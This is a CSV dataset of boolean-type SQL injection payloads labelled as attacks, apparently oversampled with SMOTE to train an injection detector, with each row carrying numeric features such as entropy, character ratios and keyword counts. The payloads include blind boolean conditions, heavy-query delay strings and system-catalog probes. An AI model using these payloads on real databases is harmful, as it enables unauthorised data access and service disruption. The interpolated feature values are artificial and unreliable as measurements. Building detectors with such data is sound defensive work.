id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001002,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000052,1.4029574202176194,234.5076288163724,30.589459113225885,3.701984996742846,50.64216354709646,65.56033325024299,90.92094334919415,27.384188669838828,0.22117291227920913,0.2742080052960135,0.38743095461308563,0.11718812781169174,0.0,0.8973647783064713,0.0,0.0,1.8973647783064713,1.1026352216935287,0.0,17.17891822645177,0.0,0.5131761084676434,5.794729556612942,3.0,0.0,0.8973647783064715,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8973647783064713,-2.7755575615628914e-17,3.692094334919414,0.0,0.0,1.0,1.0,0.10263522169352873,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8973647783064713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.692094334919414
SMOTE_001003,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,1.0882913768379023,143.48077169381008,31.497253099115728,4.1320192163321074,79.50274690088428,5.989012396462911,40.98901239646291,17.0,0.5545152007103494,0.041425590317277314,0.2855059105658996,0.11855329840647369,0.0,3.4972530991157273,0.0,0.0,1.0,1.0,0.0,5.497253099115728,0.0,0.0,2.502746900884272,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.49725309911572757,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.497253099115728
SMOTE_001004,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000125,1.2557487432633239,142.30726412583866,30.569273587416134,4.058559945177071,76.42318396854033,6.861452825167733,40.44581130067093,18.576816031459668,0.5404131343911566,0.047563181224562656,0.2819971065686528,0.13002657781562804,0.0,3.715363206291933,0.0,0.0,1.0,1.7153632062919333,0.0,5.1460896188758,1.4307264125838666,0.0,2.2846367937080667,2.715363206291933,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.7153632062919333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7153632062919333
SMOTE_001005,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,2.8640758805874373,119.69125680834354,28.53859289895706,3.8321482713615764,46.5368852125153,14.0,42.07718579791411,17.077185797914115,0.38757905697369927,0.11709694137118956,0.35221284133754627,0.14311116031756493,3.0,0.0,0.0,0.0,0.0,0.5385928989570579,0.0,9.0,0.5385928989570579,1.0,3.0,0.5385928989570576,1.0,0.0,0.0,0.0,0.0,0.538592898957058,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001006,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,0.27223079720391646,28.68695098381116,10.211369533480358,3.003950321936412,15.894315233259817,0.4755814503308038,7.264211916850449,5.052842383370088,0.5592766644514776,0.011599547569044077,0.2522554675828697,0.1768683203966086,4.0,0.0,0.0,0.0,0.0,1.0528423833700895,0.0,0.0,0.0,0.0,0.0,1.0528423833700895,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.10568476674017913,0.9471576166299104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0528423833700895
SMOTE_001007,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,1.846274141492468,145.3160399500808,31.122640033279453,4.06031488514502,79.05188014975754,8.0,40.50943986688219,17.754719933441095,0.5443707211691411,0.05505818595990898,0.2785178506556143,0.12205324221533562,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.8773599667205465,0.8773599667205465,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.5613200166397267,0.43867998336027325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001008,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,1.6941269680696633,119.54200698098,30.2033605584784,3.9505146328934897,51.93192530554481,14.6525204188588,38.3050408377176,14.652520418858801,0.4190091022427849,0.12553473574573404,0.32992142626574705,0.12553473574573404,0.0,1.0,2.0,0.0,1.0,1.5508401396196003,0.0,5.449159860380401,0.0,0.44915986038039973,1.5508401396196003,4.5508401396196,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.5508401396196002,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5508401396196003
SMOTE_001009,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000011,2.5475966478510785,121.2391396579983,28.568573281704662,3.700003819312441,35.22191526299309,26.42384349791884,46.18194120685839,13.411439690227986,0.31724809608115223,0.19504093178612278,0.3786346149563623,0.10907635717636271,0.0,0.18952442723488805,0.0,0.0,1.189524427234888,1.0,0.0,8.274293126818655,0.0,0.8104755727651121,1.9476221361744392,2.189524427234888,0.0,0.1895244272348878,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.1895244272348878,-2.7755575615628914e-17,1.5685732817046638,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.18952442723488797,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.758097708939552
SMOTE_001010,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.9160533977855384,94.63101067254703,28.89457447787058,3.5897228377868386,23.210465429201466,15.210465429201466,41.262792575208806,14.94728723893529,0.24805554022753323,0.1618138981210648,0.43187312556096114,0.1582574360904408,4.0,0.0,0.7368218097338224,0.0,0.0,1.2631781902661774,0.0,6.94728723893529,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.2631781902661774,0.7368218097338224,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001011,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.23811473757278726,39.855429423378624,15.783144135067928,2.870821971691021,2.072285288310688,11.78314413506793,20.0,6.000000000000002,0.05209246887215152,0.2954346133698511,0.5019022444292287,0.1505706733287686,1.0,0.0,0.9277147116893099,0.0,0.0,1.0,0.0,3.0,0.07228528831069012,0.0,0.0,1.9277147116893096,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.07228528831069014,0.9277147116893099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001012,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000135,1.9195924732528598,38.023166177230124,15.341055392410043,2.989646172833636,2.0,12.0,17.364221569640172,6.658944607589959,0.05267139705779711,0.31602838234678277,0.4554767157033813,0.17582350489203888,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.341055392410042,0.6589446075899577,0.0,0.0,2.0,1.0,0.0,0.0,0.6589446075899579,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001013,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.28672587043098013,39.50692297077414,15.917820495129021,2.8984791733603332,2.082179504870979,11.753461485387067,19.671281980516092,6.000000000000002,0.05314215753918444,0.29709954688690665,0.4975829557390889,0.15217533983482,1.0,0.0,1.082179504870978,0.0,0.0,1.0,0.0,2.917820495129022,0.0,0.0,0.0,2.082179504870978,1.0,0.0,0.08217950487097792,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.08217950487097792,0.9178204951290221,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001014,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000029,2.631714196122538,30.15012203122612,11.9333565773764,3.180281994460752,8.31673058778511,9.0,8.900034866064601,3.9333565773764043,0.24254176300246802,0.3385962216084939,0.29646337211455537,0.1223986432744827,1.9333565773764017,0.5166608556558996,0.0,0.0,0.0,1.4833391443441004,0.0,0.0,0.0,0.0,0.0,1.4833391443441002,0.4833391443441004,0.5166608556558996,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.4833391443441004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4833391443441006
SMOTE_001015,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,1.2510605535217771,126.30605772660189,28.558532392273882,4.038276680584121,63.39633098068471,12.234129569095533,31.67559717682165,19.0,0.5029504409453088,0.0954704309678005,0.2505056391143662,0.15107348897252446,0.7207338038630585,0.27926619613694165,2.0,0.0,1.0,1.2792661961369416,0.0,4.0,0.7207338038630584,5.0,4.0,4.279266196136942,0.7207338038630584,0.27926619613694165,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.2792661961369416,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2792661961369416
SMOTE_001016,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000130,0.5772824110113169,390.1409411193187,31.0,3.2956383974784504,95.26847007386843,56.44964768749414,185.0,53.42282335795615,0.244182929133666,0.1446992459387647,0.4741879853952786,0.13692983953229065,0.5637644772748565,0.0,0.8590588806812859,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.859058880681285,0.14094111931871411,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,1.1409411193187142,0.859058880681286,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001017,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000091,2.060713465900809,164.68963687205104,32.91795607778958,4.071456350380715,71.23065883315627,19.376934116684374,50.376934116684374,23.705109805526043,0.4277746074269465,0.11939826593291983,0.3091132669496764,0.1437138596904573,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.917956077789583,0.0,3.1640878444208353,2.623065883315626,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,2.0,0.4589780388947912,0.5410219611052087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001018,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,0.9345425917516588,58.82435737899783,20.022879193537797,3.495039819447804,12.29003858869114,17.732840604846654,22.045758387075594,6.755719798384449,0.20554357774617546,0.3069196978464547,0.37230165994165193,0.1152350644657179,0.7557197983844489,0.0,2.244280201615551,0.0,0.0,2.0,0.0,1.7557197983844492,0.0,0.0,0.0,4.244280201615551,0.7557197983844489,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.7557197983844489,0.24428020161555114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001019,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.1918754198836607,147.03285992435409,32.60657198487082,4.272277001880228,84.81971595461246,8.60657198487082,37.0,16.60657198487082,0.5768694874973342,0.058495688218986056,0.2517144007643036,0.11292042351937603,4.0,0.0,0.0,0.0,1.0,1.3934280151291818,0.0,4.0,0.0,0.0,2.6065719848708184,2.3934280151291816,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.3934280151291818,0.6065719848708183,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001020,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,1.6213174966493173,133.22014833697276,36.196724353267186,3.918578960692267,44.91334981521919,18.653399260876782,50.82669963043839,18.82669963043839,0.3381528503538796,0.13865022000307728,0.38224056980660887,0.14095635983643423,3.9133498152191954,0.0,2.0,1.0,0.0,1.456674907609598,0.0,9.0,0.0,0.0,1.0,4.9133498152191954,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.4566749076095979,0.0,0.45667490760959784,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.913349815219196
SMOTE_001021,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,1.3287298549802502,145.0345989682983,30.655133677233902,4.054074265829346,81.86160412680682,8.0,38.44866322766098,16.72433161383049,0.5648665666565821,0.0551645506544602,0.26480520317898437,0.11516367950997336,4.0,0.0,0.0,0.0,1.0,1.344866322766098,0.0,4.689732645532196,0.6897326455321957,0.0,2.0,2.3448663227660975,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001022,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000082,0.23614682482196914,25.253359465125342,12.126679732562675,3.3266029927249976,2.0,12.0,6.168906310083571,5.084453155041782,0.07934616912225717,0.476077014733543,0.24348709801462842,0.20108971812957138,0.9577734224791089,0.042226577520891095,3.0,0.0,0.0,1.0,0.0,0.042226577520890984,0.042226577520891095,0.0,0.0,4.0,0.9577734224791088,0.042226577520891095,1.0,0.0,0.0,1.0,0.042226577520891095,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001023,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000063,0.8589727074508867,154.90558871597867,32.911092162297905,4.1065197384957814,73.0,18.0,43.63336175655314,20.272226959425524,0.47144166763617473,0.11624589065001568,0.2814489224951604,0.1308635192186492,0.727773040574476,0.27222695942552405,2.0,0.0,1.0,2.0,0.0,5.272226959425525,0.0,5.0,4.0,5.0,0.7277730405744761,0.2722269594255239,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001024,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000122,0.0833336868439702,265.82015105967264,38.0,3.808428921142859,80.5323774121566,37.0,104.5323774121566,43.75539623535943,0.3028862270123282,0.13925497227567543,0.3932137765965501,0.16464502411544626,1.0,0.0,2.0,0.0,0.0,2.0,0.0,22.755396235359434,0.0,2.0,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001025,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,1.64722235899198,177.79684668806578,27.482018996606346,3.6631985214171583,63.07192401357462,24.386751705034065,67.61514247454758,22.723028494909517,0.36266712610811863,0.1290287495174721,0.3798709200978613,0.12843320427654803,0.0,0.12050474915158627,0.0,0.0,1.1205047491515863,1.879495250848414,0.0,10.964037993212688,0.0,4.397476254242069,4.241009498303172,3.0,0.0,0.12050474915158607,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.1205047491515861,-2.7755575615628914e-17,1.3615142474547586,0.0,0.0,1.0,1.0,0.8794952508484138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12050474915158611,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.361514247454759
SMOTE_001026,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,0.6793507475386777,165.74847851649622,35.67484785164962,4.165647931273665,74.26075029397064,18.48772822252557,47.812880370875945,25.187119629124055,0.44651465292857057,0.1121064872844561,0.28963100323270374,0.15174785655426964,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.325152148350378,0.0,4.3496957032992425,3.5122717774744316,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,1.1625760741751894,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.162576074175189
SMOTE_001027,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.2568237552157144,127.39225073456495,29.73204178909416,3.4589791064817126,35.875707476340885,13.26795821090584,57.784501469129914,20.46408357818832,0.2822606503732757,0.10427096172291606,0.4529068755725277,0.1605615123312806,3.73204178909416,0.0,0.0,0.0,0.7320417890941595,1.7320417890941595,0.0,10.0,1.7320417890941593,1.0,1.535916421811681,2.464083578188319,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.7320417890941595,0.0,0.0,0.7320417890941595,1.0,0.7320417890941595,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2679582109058405,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.464083578188319
SMOTE_001028,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,0.5447589146317496,147.3204001239526,33.0,4.088368903575816,71.80100030988147,10.121400433834072,46.03879962814223,19.359199752094817,0.48733044043062335,0.06861901395507626,0.31258935942615784,0.13146118618814256,1.0,0.0,2.0,0.0,1.0,1.160200061976296,0.0,6.6795998760474085,0.8397999380237038,0.0,2.8397999380237042,4.160200061976296,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.16020006197629602,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1602000619762958
SMOTE_001029,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.010931840043498666,124.99251211848576,33.00748788151423,3.795770576372327,43.97004847394307,15.029951526056927,48.99625605924288,16.99625605924288,0.35177792039216327,0.12025081359218401,0.391993425274768,0.13597784074088473,2.996256059242884,0.0,2.0,1.0,0.0,1.0037439407571158,0.0,8.996256059242885,0.0,0.0,1.0,4.003743940757116,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.003743940757115982,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0037439407571158
